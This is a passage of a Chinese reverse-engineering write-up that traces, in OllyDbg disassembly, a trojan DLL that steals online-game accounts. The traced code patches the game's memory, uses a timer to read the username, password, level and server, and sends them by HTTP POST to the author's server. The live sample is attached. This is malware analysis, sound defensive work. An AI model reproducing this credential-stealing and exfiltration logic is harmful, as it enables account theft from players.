+003E4549  |.  E8 DAF2FFFF   call    <jmp.&kernel32.CompareStringA>            ; \CompareStringA
+003E454E  |.  83F8 02        cmp     eax, 2
+003E4551  |.  0F94C0         sete    al                                       ; 设置标志位.
+003E4554  |.  5E             pop     esi
+003E4555  |.  5B             pop     ebx
+003E4556  \.  C3             retn
+```
+
+### 堆栈数据
+
+```
+0006F624   00000400  |LocaleId = 400
+0006F628   00000001  |CmpOptions = NORM_IGNORECASE
+0006F62C   00890030  |String1 = "LOADDLL.EXE"
+0006F630   FFFFFFFF  |Count1 = FFFFFFFF (-1.)
+0006F634   003E46F0  |String2 = "LUNAClient.exe"
+0006F638   FFFFFFFF  \Count2 = FFFFFFFF (-1.)
+```
+
+进而打开互斥体 `DFDLL`, 当然是打开失败, 然后跟进 `003e4590`
+
+```
+003E4590  /$  68 60693E00   push    003E6960                                  ; /pThreadId = 1.003E6960
+003E4595  |.  6A 00          push    0                                         ; |CreationFlags = 0
+003E4597  |.  6A 00          push    0                                         ; |pThreadParm = NULL
+003E4599  |.  68 C8433E00   push    003E43C8                                  ; |ThreadFunction = 1.003E43C8
+003E459E  |.  6A 00          push    0                                         ; |StackSize = 0
+003E45A0  |.  6A 00          push    0                                         ; |pSecurity = NULL
+003E45A2  |.  E8 B1F2FFFF   call    <jmp.&kernel32.CreateThread>              ; \CreateThread
+003E45A7  \.  C3             retn
+```
+
+看得到创建了线程, 断下继续:
+
+```
+003E43C8  /.  55             push    ebp                                       ;  TheradFunc
+003E43C9  |.  8BEC           mov     ebp, esp
+003E43CB  |.  83C4 E4        add     esp, -1C
+003E43CE  |.  53             push    ebx
+003E43CF  |.  56             push    esi
+003E43D0  |.  8D75 E4        lea     esi, dword ptr [ebp-1C]
+003E43D3  |.  68 28443E00   push    003E4428                                  ;  ASCII "DFDLL"
+003E43D8  |.  6A 00          push    0
+003E43DA  |.  6A 00          push    0
+003E43DC  |.  E8 57F4FFFF   call    003E3838                                  ;  创间互尺体。
+003E43E1  |.  8BD8           mov     ebx, eax
+003E43E3  |.  E8 34FFFFFF   call    003E431C
+003E43E8  |.  EB 0C          jmp     short 003E43F6
+003E43EA  |>  56             /push    esi                                      ; /pMsg
+003E43EB  |.  E8 E8F4FFFF   |call    <jmp.&user32.TranslateMessage>           ; \TranslateMessage
+003E43F0  |.  56             |push    esi                                      ; /pMsg
+003E43F1  |.  E8 BAF4FFFF   |call    <jmp.&user32.DispatchMessageA>           ; \DispatchMessageA
+003E43F6  |>  6A 00          push    0                                         ; /MsgFilterMax = 0
+003E43F8  |.  6A 00          |push    0                                        ; |MsgFilterMin = 0
+003E43FA  |.  6A 00          |push    0                                        ; |hWnd = NULL
+003E43FC  |.  56             |push    esi                                      ; |pMsg
+003E43FD  |.  E8 B6F4FFFF   |call    <jmp.&user32.GetMessageA>                ; \GetMessageA
+003E4402  |.  85C0           |test    eax, eax
+003E4404  |.^ 75 E4          \jnz     short 003E43EA
+003E4406  |.  6A 00          push    0                                         ; /ExitCode = 0
+003E4408  \.  E8 53F4FFFF   call    <jmp.&kernel32.ExitThread>                ; \ExitThread
+
+003E440D   .  53             push    ebx                                      ; /hObject
+003E440E   .  E8 0DF4FFFF   call    <jmp.&kernel32.CloseHandle>              ; \CloseHandle
+003E4413   .  6A 00          push    0                                         ; /ExitCode = 0
+003E4415   .  A1 50663E00   mov     eax, dword ptr [3E6650]                   ; |
+```
+
+
+
+## 反汇编代码片段
+
+```
+003E441A   .  50                push    eax                                          ; |hLibModule => 003E0000
+
+003E441B   .  E8 48F4FFFF       call    <jmp.&kernel32.FreeLibraryAndExitThread>      ; \FreeLibraryAndExitThread
+
+003E4420   .  5E                pop     esi
+
+003E4421   .  5B                pop     ebx
+
+003E4422   .  8BE5              mov     esp, ebp
+
+003E4424   .  5D                pop     ebp
+
+003E4425   .  C2 0400           ret     4
+```
+
+## 互斥体创建 (`call: 创建互斥体`)
+
+`3e3838 call`: 创建互斥体，保持同时只有一个木马被加载：
+
+```
+003E3838  /$  55                push    ebp
+
+003E3839  |.  8BEC              mov     ebp, esp
+
+003E383B  |.  8B45 10           mov     eax, dword ptr [ebp+10]
+
+003E383E  |.  50                push    eax                                          ; /MutexName = "DFDLL"
+
+003E383F  |.  837D 0C 01        cmp     dword ptr [ebp+C], 1                         ; |
+
+003E3843  |.  1BC0              sbb     eax, eax                                     ; |
+
+003E3845  |.  40                inc     eax                                          ; |
+
+003E3846  |.  83E0 7F           and     eax, 7F                                      ; |
+
+003E3849  |.  50                push    eax                                          ; |InitialOwner
+
+003E384A  |.  8B45 08           mov     eax, dword ptr [ebp+8]                       ; |
+
+003E384D  |.  50                push    eax                                          ; |pSecurity
+
+003E384E  |.  E8 DDFFFFFF       call    <jmp.&kernel32.CreateMutexA>                 ; \CreateMutexA
+
+003E3853  |.  5D                pop     ebp
+
+003E3854  \\. C2 0C00           ret     0C
+```
+
+## 定时器注册 (`call: 在注册一个 Timer 之前...)`
+
+`003E431C call`: 在注册一个 `Timer` 之前还有一个 `call 3e3d0c` (对当前进程写入次数据, 第一次一个字节, 第二次一个 DWORD, 重复三次).
+
+```
+003E431C  /$  B8 8C683E00       mov     eax, 003E688C
+
+003E4321  |.  33C9              xor     ecx, ecx
+
+003E4323  |.  BA 40000000       mov     edx, 40
+
+003E4328  |.  E8 A7E2FFFF       call    003E25D4
+
+003E432D  |.  B8 CC683E00       mov     eax, 003E68CC
+
+003E4332  |.  33C9              xor     ecx, ecx
+
+003E4334  |.  BA 40000000       mov     edx, 40
+
+003E4339  |.  E8 96E2FFFF       call    003E25D4
+
+003E433E  |.  B8 0C693E00       mov     eax, 003E690C
+
+003E4343  |.  33C9              xor     ecx, ecx
+
+003E4345  |.  BA 40000000       mov     edx, 40
+
+003E434A  |.  E8 85E2FFFF       call    003E25D4
+
+003E434F  |.  E8 B8F9FFFF       call    003E3D0C
+
+003E4354  |.  68 D03E3E00       push    003E3ED0                                     ; /Timerproc = 1.003E3ED0
+
+003E4359  |.  68 10270000       push    2710                                         ; |Timeout = 10000. ms
+
+003E435E  |.  6A 00             push    0                                            ; |TimerID = 0
+
+003E4360  |.  6A 00             push    0                                            ; |hWnd = NULL
+
+003E4362  |.  E8 61F5FFFF       call    <jmp.&user32.SetTimer>                       ; \SetTimer
+
+003E4367  |.  A3 4C693E00       mov     dword ptr [3E694C], eax
+
+003E436C  \\. C3                ret
+```
+
+## 进程内存写入 (`3e3d0c 写进程内存`)
+
+```
+003E3D0C  /$  53                push    ebx
+
+003E3D0D  |.  56                push    esi
+
+003E3D0E  |.  57                push    edi
+
+003E3D0F  |.  55                push    ebp
+
+003E3D10  |.  83C4 F4           add     esp, -0C
+
+003E3D13  |.  C64424 04 E9      mov     byte ptr [esp+4], 0E9
+
+003E3D18  |.  B8 A8423E00       mov     eax, 003E42A8
+
+003E3D1D  |.  2D E0CE4000       sub     eax, 40CEE0
+
+003E3D22  |.  83E8 05           sub     eax, 5
+
+003E3D25  |.  A3 74663E00       mov     dword ptr [3E6674], eax
+
+003E3D2A  |.  B8 CC423E00       mov     eax, 003E42CC
+
+003E3D2F  |.  2D F1CE4000       sub     eax, 40CEF1
+
+003E3D34  |.  83E8 05           sub     eax, 5
+
+003E3D37  |.  A3 78663E00       mov     dword ptr [3E6678], eax
+
+003E3D3C  |.  B8 F0423E00       mov     eax, 003E42F0
+
+003E3D41  |.  2D 05924000       sub     eax, 409205
+
+003E3D46  |.  83E8 05           sub     eax, 5
+
+003E3D49  |.  A3 7C663E00       mov     dword ptr [3E667C], eax
+
+003E3D4E  |.  E8 1DFBFFFF       call    <jmp.&kernel32.GetCurrentProcessId>          ; [GetCurrentProcessId
+
+003E3D53  |.  50                push    eax                                          ; /ProcessId
+
+003E3D54  |.  6A FF             push    -1                                           ; |Inheritable = TRUE
+
+003E3D56  |.  68 FF0F1F00       push    1F0FFF                                       ; |Access = PROCESS_ALL_ACCESS
+
+003E3D5B  |.  E8 38FBFFFF       call    <jmp.&kernel32.OpenProcess>                  ; \OpenProcess
+
+003E3D60  |.  8BE8              mov     ebp, eax
+
+003E3D62  |.  85ED              test    ebp, ebp
+
+003E3D64  |.  74 4A             je      short 003E3DB0
+
+003E3D66  |.  C70424 030000>    mov     dword ptr [esp], 3
+
+003E3D6D  |.  BB B0503E00       mov     ebx, 003E50B0                                ;  ASCII "辔@"
+
+003E3D72  |.  BE BC503E00       mov     esi, 003E50BC                                ;  ASCII "嵛@"
+
+003E3D77  |.  BF 74663E00       mov     edi, 003E6674
+
+003E3D7C  |>  8D4424 08         /lea      eax, dword ptr [esp+8]
+
+003E3D80  |.  50                |push      eax                                      ; /pBytesWritten
+
+003E3D81  |.  6A 01             |push      1                                        ; |BytesToWrite = 1
+
+003E3D83  |.  8D4424 0C         |lea      eax, dword ptr [esp+C]                     ; |
+
+003E3D87  |.  50                |push      eax                                      ; |Buffer
+
+003E3D88  |.  8B03              |mov      eax, dword ptr [ebx]                        ; |
+
+003E3D8A  |.  50                |push      eax                                      ; |Address
+
+003E3D8B  |.  55                |push      ebp                                      ; |hProcess
+
+003E3D8C  |.  E8 0FFBFFFF       |call      <jmp.&kernel32.WriteProcessMemory>        ; \WriteProcessMemory
+
+003E3D91  |.  8D4424 08         |lea      eax, dword ptr [esp+8]
+
+003E3D95  |.  50                |push      eax                                      ; /pBytesWritten
+
+003E3D96  |.  6A 04             |push      4                                        ; |BytesToWrite = 4
+
+003E3D98  |.  57                |push      edi                                      ; |Buffer
+
+003E3D99  |.  8B06              |mov      eax, dword ptr [esi]                        ; |
+
+003E3D9B  |.  50                |push      eax                                      ; |Address
+
+003E3D9C  |.  55                |push      ebp                                      ; |hProcess
+
+003E3D9D  |.  E8 FEFAFFFF       |call      <jmp.&kernel32.WriteProcessMemory>        ; \WriteProcessMemory
+
+003E3DA2  |.  83C7 04           |add      edi, 4
+
+003E3DA5  |.  83C6 04           |add      esi, 4
+
+003E3DA8  |.  83C3 04           |add      ebx, 4
+
+003E3DAB  |.  FF0C24            |dec      dword ptr [esp]
+
+003E3DAE  |.^ 75 CC             \jnz      short 003E3D7C
+
+003E3DB0  |>  83C4 0C           add     esp, 0C
+
+003E3DB3  |.  5D                pop     ebp
+
+003E3DB4  |.  5F                pop     edi
+
+003E3DB5  |.  5E                pop     esi
+
+003E3DB6  |.  5B                pop     ebx
+
+003E3DB7  \\. C3                ret
+```
+
+## 定时器逻辑 (`Timer`)
+
+来看 `timer`:
+
+这个 `Timer` 就是专门负责盗取账号密码的. `Timer` 的间隔时间设置为 10s, 只有当用户登录了之后密码才会在内存里面.
+
+```
+003E3ED0  /.  55                push    ebp
+
+003E3ED1  |.  8BEC              mov     ebp, esp
+
+003E3ED3  |.  B9 04000000       mov     ecx, 4
+
+003E3ED8  |>  6A 00             /push    0
+
+003E3EDA  |.  6A 00             |push    0
+
+003E3EDC  |.  49                |dec     ecx
+
+003E3EDD  |.^ 75 F9             \jnz     short 003E3ED8                             ;  压点空间出来。
+
+003E3EDF  |.  51                push    ecx
+
+003E3EE0  |.  33C0              xor     eax, eax
+
+003E3EE2  |.  55                push    ebp
+
+003E3EE3  |.  68 18403E00       push    003E4018
+
+003E3EE8  |.  64:FF30           push    dword ptr fs:[eax]
+
+003E3EEB  |.  64:8920           mov     dword ptr fs:[eax], esp
+
+003E3EEE  |.  833D D4503E00>    cmp     dword ptr [3E50D4], 0A
+
+003E3EF5  |.  0F8C FC000000     jl      003E3FF7
+
+003E3EFB  |.  8D45 FC           lea     eax, dword ptr [ebp-4]                     ;  作为输出参数。
+```
+
+
+
+## 003E3EFE | BA 20ED8500
+
+`mov` `edx, 85ED20`
+
+**注释：** 作参数。游戏进程的某内存地址。
+
+## 003E3F03 | E8 D0F1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读某值。这个东西读出来是为了判断游戏版本。
+
+## 003E3F08 | 837D FC 00
+
+`cmp` `dword ptr [ebp-4], 0`
+
+## 003E3F0C | 0F84 E5000000
+
+`je` `003E3FF7`
+
+**注释：** 这里我们的是 `OD`，不是游戏，所以肯定会挑走，我们不让他挑走。
+
+## 003E3F12 | E8 A1FEFFFF
+
+`call` `003E3DB8`
+
+**注释：** 读 `ini` 配置文件相关信息。
+
+## 003E3F17 | 68 2C403E00
+
+`push` `003E402C`
+
+**注释：** `ASCII "User="`
+
+## 003E3F1C | 8D45 F4
+
+`lea` `eax, dword ptr [ebp-C]`
+
+## 003E3F1F | BA 8C683E00
+
+`mov` `edx, 003E688C`
+
+## 003E3F24 | E8 AFF1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读用户名内容。
+
+## 003E3F29 | FF75 F4
+
+`push` `dword ptr [ebp-C]`
+
+## 003E3F2C | 68 3C403E00
+
+`push` `003E403C`
+
+## 003E3F31 | 68 48403E00
+
+`push` `003E4048`
+
+**注释：** `ASCII "Pass="`
+
+## 003E3F36 | 8D45 F0
+
+`lea` `eax, dword ptr [ebp-10]`
+
+## 003E3F39 | BA CC683E00
+
+`mov` `edx, 003E68CC`
+
+## 003E3F3E | E8 95F1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读密码内容。
+
+## 003E3F43 | FF75 F0
+
+`push` `dword ptr [ebp-10]`
+
+## 003E3F46 | 68 3C403E00
+
+`push` `003E403C`
+
+## 003E3F4B | 68 58403E00
+
+`push` `003E4058`
+
+**注释：** `ASCII "Leve="`
+
+## 003E3F50 | A1 CC503E00
+
+`mov` `eax, dword ptr [3E50CC]`
+
+## 003E3F55 | E8 AEF2FFFF
+
+`call` `<CheckPointer>`
+
+## 003E3F5A | 8BD0
+
+`mov` `edx, eax`
+
+## 003E3F5C | 8D45 EC
+
+`lea` `eax, dword ptr [ebp-14]`
+
+## 003E3F5F | E8 74F1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读等级。
+
+## 003E3F64 | FF75 EC
+
+`push` `dword ptr [ebp-14]`
+
+## 003E3F67 | 68 3C403E00
+
+`push` `003E403C`
+
+## 003E3F6C | 68 68403E00
+
+`push` `003E4068`
+
+**注释：** `ASCII "Serv="`
+
+## 003E3F71 | A1 D0503E00
+
+`mov` `eax, dword ptr [3E50D0]`
+
+## 003E3F76 | E8 8DF2FFFF
+
+`call` `<CheckPointer>`
+
+## 003E3F7B | 8BD0
+
+`mov` `edx, eax`
+
+## 003E3F7D | 8D45 E8
+
+`lea` `eax, dword ptr [ebp-18]`
+
+## 003E3F80 | E8 53F1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读服务器。
+
+## 003E3F85 | FF75 E8
+
+`push` `dword ptr [ebp-18]`
+
+## 003E3F88 | 68 3C403E00
+
+`push` `003E403C`
+
+## 003E3F8D | 68 78403E00
+
+`push` `003E4078`
+
+**注释：** `ASCII "Cank="`
+
+## 003E3F92 | 8B45 FC
+
+`mov` `eax, dword ptr [ebp-4]`
+
+## 003E3F95 | E8 6EF2FFFF
+
+`call` `<CheckPointer>`
+
+## 003E3F9A | 8BD0
+
+`mov` `edx, eax`
+
+## 003E3F9C | 8D45 E4
+
+`lea` `eax, dword ptr [ebp-1C]`
+
+## 003E3F9F | E8 34F1FFFF
+
+`call` `<Read_Dword>`
+
+**注释：** 读 `CANK`
+
+## 003E3FA4 | FF75 E4
+
+`push` `dword ptr [ebp-1C]`
+
+## 003E3FA7 | 8D45 F8
+
+`lea` `eax, dword ptr [ebp-8]`
+
+## 003E3FAA | BA 0E000000
+
+`mov` `edx, 0E`
+
+## 003E3FAF | E8 B8F1FFFF
+
+`call` `003E316C`
+
+## 003E3FB4 | 8B45 F8
+
+`mov` `eax, dword ptr [ebp-8]`
+
+## 003E3FB7 | 50
+
+`push` `eax`
+
+## 003E3FB8 | 8D45 E0
+
+`lea` `eax, dword ptr [ebp-20]`
+
+## 003E3FBB | BA 80673E00
+
+`mov` `edx, 003E6780`
+
+## 003E3FC0 | B9 00010000
+
+`mov` `ecx, 100`
+
+## 003E3FC5 | E8 3EF1FFFF
+
+`call` `003E3108`
+
+## 003E3FCA | 8B45 E0
+
+`mov` `eax, dword ptr [ebp-20]`
+
+## 003E3FCD | 50
+
+`push` `eax`
+
+## 003E3FCE | 8D45 DC
+
+`lea` `eax, dword ptr [ebp-24]`
+
+## 003E3FD1 | BA 80663E00
+
+`mov` `edx, 003E6680`
+
+## 003E3FD6 | B9 00010000
+
+`mov` `ecx, 100`
+
+## 003E3FDB | E8 28F1FFFF
+
+`call` `003E3108`
+
+## 003E3FE0 | 8B45 DC
+
+`mov` `eax, dword ptr [ebp-24]`
+
+## 003E3FE3 | 5A
+
+`pop` `edx`
+
+## 003E3FE4 | 59
+
+`pop` `ecx`
+
+## 003E3FE5 | E8 12FAFFFF
+
+`call` `003E39FC`
+
+**注释：** 发送密码等信息。
+
+## 003E3FEA | A1 4C693E00
+
+`mov` `eax, dword ptr [3E694C]`
+
+## 003E3FEF | 50
+
+`push` `eax`
+
+**注释：** `/TimerID => 7DD3 (32211.)`
+
+## 003E3FF0 | 6A 00
+
+`push` `0`
+
+**注释：** `|hWnd = NULL`
+
+## 003E3FF2 | E8 C9F8FFFF
+
+`call` `<jmp.&user32.KillTimer>`
+
+**注释：** `KillTimer`
+
+## 003E3FF7 | FF05 D4503E00
+
+`inc` `dword ptr [3E50D4]`
+
+## 003E3FFD | 33C0
+
+`xor` `eax, eax`
+
+## 003E3FFF | 5A
+
+`pop` `edx`
+
+## 003E4000 | 59
+
+`pop` `ecx`
+
+## 003E4001 | 59
+
+`pop` `ecx`
+
+## 003E4002 | 64:8910
+
+`mov` `dword ptr fs:[eax], edx`
+
+## 003E4005 | 68 1F403E00
+
+`push` `003E401F`
+
+## 003E400A | 8D45 DC
+
+`lea` `eax, dword ptr [ebp-24]`
+
+## 003E400D | BA 09000000
+
+`mov` `edx, 9`
+
+## 003E4012 | E8 F1EFFFFF
+
+`call` `003E3008`
+
+## 003E4017 | C3
+
+`retn`
+
+---
+
+在用 `OD` 调试的时候，由于该 `dll` 木马中设定的游戏内存地址在 `Loaddll` 中并不存在，所以单步跟会异常的，我直接新建 `EIP` 的。
+
+`003E39FC` 这个 `call` 就是用于最后发送密码等信息。发送完就 `killTimer` 收工。
+
+还是去看一下这个发送函数，它使用的是 `POST` 方式发送到指定地址的。
+
+... ...
+
+## 003E3A46 | 6A 00
+
+`push` `0`
+
+## 003E3A48 | 6A 00
+
+`push` `0`
+
+## 003E3A4A | 6A 00
+
+`push` `0`
+
+## 003E3A4C | 6A 00
+
+`push` `0`
+
+## 003E3A4E | 68 203C3E00
+
+`push` `003E3C20`
+
+**注释：** `ASCII "MyApp"`
+
+## 003E3A53 | E8 F0FEFFFF
+
+`call` `<jmp.&wininet.InternetOpenA>`
+
+## 003E3A58 | 8945 F0
+
+`mov` `dword ptr [ebp-10], eax`
+
+## 003E3A5B | 33D2
+
+`xor` `edx, edx`
+
+## 003E3A5D | 55
+
+`push` `ebp`
+
+## 003E3A5E | 68 D73B3E00
+
+`push` `003E3BD7`
+
+## 003E3A63 | 64:FF32
+
+`push` `dword ptr fs:[edx]`
+
+## 003E3A66 | 64:8922
+
+`mov` `dword ptr fs:[edx], esp`
+
+## 003E3A69 | 837D F0 00
+
+`cmp` `dword ptr [ebp-10], 0`
+
+## 003E3A6D | 0F84 4D010000
+
+`je` `003E3BC0`
+
+## 003E3A73 | 8D45 D8
+
+`lea` `eax, dword ptr [ebp-28]`
+
+## 003E3A76 | 50
+
+`push` `eax`
+
+## 003E3A77 | 8D4D DC
+
+`lea` `ecx, dword ptr [ebp-24]`
+
+## 003E3A7A | 8B55 F8
+
+`mov` `edx, dword ptr [ebp-8]`
+
+## 003E3A7D | 8B45 FC
+
+`mov` `eax, dword ptr [ebp-4]`
+
+## 003E3A80 | E8 0BFFFFFF
+
+`call` `003E3990`
+
+## 003E3A85 | 6A 00
+
+`push` `0`
+
+## 003E3A87 | 6A 00
+
+`push` `0`
+
+## 003E3A89 | 6A 03
+
+`push` `3`
+
+## 003E3A8B | 6A 00
+
+`push` `0`
+
+## 003E3A8D | 6A 00
+
+`push` `0`
+
+## 003E3A8F | 6A 50
+
+`push` `50`
+
+## 003E3A91 | 8B45 DC
+
+`mov` `eax, dword ptr [ebp-24]`
+
+## 003E3A94 | E8 6FF7FFFF
+
+`call` `<CheckPointer>`
+
+## 003E3A99 | 50
+
+`push` `eax`
+
+## 003E3A9A | 8B45 F0
+
+`mov` `eax, dword ptr [ebp-10]`
+
+## 003E3A9D | 50
+
+`push` `eax`
+
+## 003E3A9E | E8 9DFEFFFF
+
+`call` `<jmp.&wininet.InternetConnectA>`
+
+## 003E3AA3 | 8945 EC
+
+`mov` `dword ptr [ebp-14], eax`
+
+## 003E3AA6 | B8 283C3E00
+
+`mov` `eax, 003E3C28`
+
+**注释：** `ASCII "Accept: */*"`
+
+## 003E3AAB | 8945 D4
+
+`mov` `dword ptr [ebp-2C], eax`
+
+## 003E3AAE | 6A 00
+
+`push` `0`
+
+## 003E3AB0 | 68 00000080
+
+`push` `80000000`
+
+## 003E3AB5 | 8D45 D4
+
+`lea` `eax, dword ptr [ebp-2C]`
+
+## 003E3AB8 | 50
+
+`push` `eax`
+
+## 003E3AB9 | 6A 00
+
+`push` `0`
+
+## 003E3ABB | 68 343C3E00
+
+`push` `003E3C34`
+
+**注释：** `ASCII "HTTP/1.0"`
+
+## 003E3AC0 | 8B45 D8
+
+`mov` `eax, dword ptr [ebp-28]`
+
+## 003E3AC3 | E8 40F7FFFF
+
+`call` `<CheckPointer>`
+
+## 003E3AC8 | 50
+
+`push` `eax`
+
+## 003E3AC9 | 68 403C3E00
+
+`push` `003E3C40`
+
+**注释：** `ASCII "POST"`
+
+## 003E3ACE | 8B45 EC
+
+`mov` `eax, dword ptr [ebp-14]`
+
+## 003E3AD1 | 50
+
+`push` `eax`
+
+## 003E3AD2 | E8 49FEFFFF
+
+`call` `<jmp.&wininet.HttpOpenRequestA>`
+
+## 003E3AD7 | 8945 E8
+
+`mov` `dword ptr [ebp-18], eax`
+
+## 003E3ADA | 8B45 F4
+
+`mov` `eax, dword ptr [ebp-C]`
+
+
+
+```
+003E3ADD   .  E8 3EF6FFFF   call    003E3120  
+003E3AE2   .  50            push    eax  
+003E3AE3   .  8B45 F4       mov     eax, dword ptr [ebp-C]  
+003E3AE6   .  E8 1DF7FFFF   call    <CheckPointer>  
+003E3AEB   .  50            push    eax  
+003E3AEC   .  6A 2F         push    2F  
+003E3AEE   .  68 483C3E00   push    003E3C48                                          ;  ASCII "Content-Type: application/x-www-form-urlencoded"  
+003E3AF3   .  8B45 E8       mov     eax, dword ptr [ebp-18]  
+003E3AF6   .  50            push    eax  
+003E3AF7   .  E8 34FEFFFF   call    <jmp.&wininet.HttpSendRequestA>  
+003E3AFC   .  33C0          xor     eax, eax  
+003E3AFE   .  8945 CC       mov     dword ptr [ebp-34], eax  
+003E3B01   .  C745 D0 00040>mov     dword ptr [ebp-30], 400  
+003E3B08   .  8B45 D0       mov     eax, dword ptr [ebp-30]  
+003E3B0B   .  E8 28E9FFFF   call    003E2438  
+003E3B10   .  8BD8          mov     ebx, eax  
+003E3B12   .  8D45 CC       lea     eax, dword ptr [ebp-34]  
+003E3B15   .  50            push    eax  
+003E3B16   .  8D45 D0       lea     eax, dword ptr [ebp-30]  
+003E3B19   .  50            push    eax  
+003E3B1A   .  53            push    ebx  
+003E3B1B   .  6A 05         push    5  
+003E3B1D   .  8B45 E8       mov     eax, dword ptr [ebp-18]  
+003E3B20   .  50            push    eax  
+003E3B21   .  E8 02FEFFFF   call    <jmp.&wininet.HttpQueryInfoA>  
+```
+
+很显然，木马调用`HttpSendRequestA`向木马作者服务器提交`POST`请求以提交帐号密码等数据。
+
+另外，此`dll`虽导出了`HookOn`和`HookOff`函数，不过里面却是空的，没做啥事，应为该木马主要是通过`SetWindowsHookEx`的方式来将`dll`注入至游戏进程的。并`没` `Hook`啥东西。
+
+附件为样本，密码:`pediy`
+
+### 上传的附件
+
+| ![image](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | `LuDll.rar` |
+| :--- | :--- |
